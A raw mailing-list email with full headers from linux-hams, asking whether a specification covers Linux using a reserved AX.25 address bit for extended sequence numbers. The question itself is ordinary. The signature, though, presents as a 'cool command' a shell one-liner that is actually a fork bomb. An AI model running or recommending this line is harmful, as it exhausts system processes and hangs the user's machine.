Return-Path: <linux-hams-owner@vger.kernel.org>
X-Original-To: lists+linux-hams@lfdr.de
Delivered-To: lists+linux-hams@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id E584943CA86
	for <lists+linux-hams@lfdr.de>; Wed, 27 Oct 2021 15:23:54 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S236352AbhJ0N0T (ORCPT <rfc822;lists+linux-hams@lfdr.de>);
        Wed, 27 Oct 2021 09:26:19 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56866 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229585AbhJ0N0S (ORCPT
        <rfc822;linux-hams@vger.kernel.org>); Wed, 27 Oct 2021 09:26:18 -0400
Received: from mail-ua1-x936.google.com (mail-ua1-x936.google.com [IPv6:2607:f8b0:4864:20::936])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 47184C061570
        for <linux-hams@vger.kernel.org>; Wed, 27 Oct 2021 06:23:53 -0700 (PDT)
Received: by mail-ua1-x936.google.com with SMTP id s4so5014134uaq.0
        for <linux-hams@vger.kernel.org>; Wed, 27 Oct 2021 06:23:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=habets.se; s=google;
        h=mime-version:from:date:message-id:subject:to;
        bh=VldE9v/70E5InsJ+qt74k4bkvSq+51WUMJQK0Xbod5Q=;
        b=gNwk1EDlkNgTo480GbbHlj+3zuKRxzCjNtHEURWOSMjpO+oTZZ0wIkWxho/iBt5Au0
         gQxvwpC3cR9B2Qj2y2wy3uji5G9WxLy/DO5rKR73t48YliA3rpJC51z6s+Lym1XT2vz6
         kENI7aAoRNQh6bqhRn7b8XDgng/yutsk6MBPU=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=VldE9v/70E5InsJ+qt74k4bkvSq+51WUMJQK0Xbod5Q=;
        b=C4wpEVf0u61gyeKjpETjehViXQBOwZKKsaENeuxc2wrD8mhdZn1zTeIfG2l68bCODA
         ZaU2bqvDJYiCJJ8hhcuMrMqafgJHufeu5J/hsKC3SX0w+8M9NPaGDMwBdl7t0YpvLOQO
         MScw841NXf2PIuS1A0oZ9Kqi1NrW4J8WDTbgkR2wvY58B1qphMeQNKf37U8WNswCDJyU
         rKo1PIbqEmjufoc49yewT8jqb22rpBmWKhmw8zezKi/ZfLSpmkiDOlQXttgIS6+VbWqk
         ebB4idzQjovU5PveBbA6XHGVjbwGfA6qvdgAfECGyAx8FKHfJ8NYCOq+2cvmtK+UFTdc
         HIUQ==
X-Gm-Message-State: AOAM531GlSaqbo6c2cIx+AAfpWvwsINXAYVpoB7IAXc2JlfSyzLDUyYl
        jXUbnCm6MdELj4jVdnNDb3fvYRG/nASm4Hq7LGDIVI2smy8=
X-Google-Smtp-Source: ABdhPJz40pynOHNpoji98IaYD6feC3r+LyDhz9ZYkEMq2n4trrkZYqgXwCn1Erd9u326XPrvj3ZlUUrSCe10QcsbgZE=
X-Received: by 2002:a05:6102:cd2:: with SMTP id g18mr30391298vst.25.1635341031978;
 Wed, 27 Oct 2021 06:23:51 -0700 (PDT)
Received: from 195210475306 named unknown by gmailapi.google.com with
 HTTPREST; Wed, 27 Oct 2021 06:23:51 -0700
MIME-Version: 1.0
From:   thomas@habets.se
Date:   Wed, 27 Oct 2021 06:23:51 -0700
Message-ID: <CA+kHd+eunGfNi+mufRe8e3=q+uRt+zz_MeREohORFXctTQv23Q@mail.gmail.com>
Subject: Is there a spec for the AX.25 reserved bit being used for AX25_EXTSEQ?
To:     linux-hams@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Precedence: bulk
List-ID: <linux-hams.vger.kernel.org>
X-Mailing-List: linux-hams@vger.kernel.org

Hi.

I noticed that when AX25_EXTSEQ is used, Linux clears one of the
reserved bits in the destination address.

In the AX.25 2.2 spec[1] these are just marked as reserved. Linux
seems to use one to indicate extended sequence number.

This makes sense, since it allows decoding of I frames without first
having seen the SABME frame. (SABME being the indicator that sequence
numbers are 7 bits instead of 3, as opposed to SABM)

Question: Is there a spec for this use of the (by spec 2.2) reserved bit?

The git repo doesn't have history far enough to comment on when this
code was written, but it's been this way since Linux 1.3.14 introduced
AX25_EXTSEQ back in June 1995. lkml.org doesn't even have archives
that far back.

axlisten (from ax25-apps) uses the bit this way since git history
start, "Import ax25-apps 0.0.1 from tarball" in 1999.

[1] http://www.tapr.org/pdf/AX25.2.2.pdf

--
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.se" };
  char kernel[]    = { "Linux" };
  char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] = { "9907 8698 8A24 F52F 1C2E  87F6 39A4 9EEA 460A 0169" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
